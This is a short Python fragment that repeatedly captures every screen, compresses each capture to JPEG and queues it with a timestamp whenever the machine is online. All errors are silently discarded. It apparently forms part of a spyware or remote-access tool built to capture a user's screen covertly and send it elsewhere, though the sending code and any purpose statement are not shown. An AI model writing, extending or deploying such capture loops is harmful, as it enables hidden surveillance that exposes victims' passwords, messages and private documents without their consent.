def f_grab():
    from PIL import ImageGrab
    im = ImageGrab.grab(all_screens=True)
    im.thumbnail((1600, 1000))
    b = io.BytesIO()
    im.convert("RGB").save(b, "JPEG", quality=55)
    return b.getvalue()


def f_shot_loop():
    while G.get("run"):
        try:
            if f_online():
                f_queue({"t": "shot", "ts": int(time.time())}, f_grab())
        except Exception:
            pass
        time.sleep(CFG["shot"])
